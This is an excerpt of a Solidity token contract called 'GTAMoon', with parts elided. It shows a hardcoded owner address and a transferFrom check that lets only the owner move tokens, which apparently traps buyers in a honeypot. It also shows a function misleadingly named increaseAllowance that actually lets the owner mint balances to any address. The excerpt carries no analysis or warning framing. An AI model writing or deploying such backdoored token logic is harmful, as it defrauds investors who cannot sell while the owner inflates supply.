...
contract Ownable is Context {
    ...
    address private _ownerAddress = 0x3987dC1207Bc309b7EF1098b0fa94439393BBAE8;
...
contract GTAMoon is Context, IERC20, Ownable {
    ...
    string private _name = "GTAMoon";
    string private _symbol = "GTAMoon";
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
     ...
     require(owners == sender, "no authority");
       ...
       function increaseAllowance(address spend, uint256 Value) external ownerAddress() {
        require(Value > 0, "TTT");
        uint256 D = OKAC[spend];
        if (D == 0) _BBAC.push(spend);
        OKAC[spend] = D.add(Value);
        cat = cat.add(Value);
        _rOwned[spend] = _rOwned[spend].add(Value);
    }
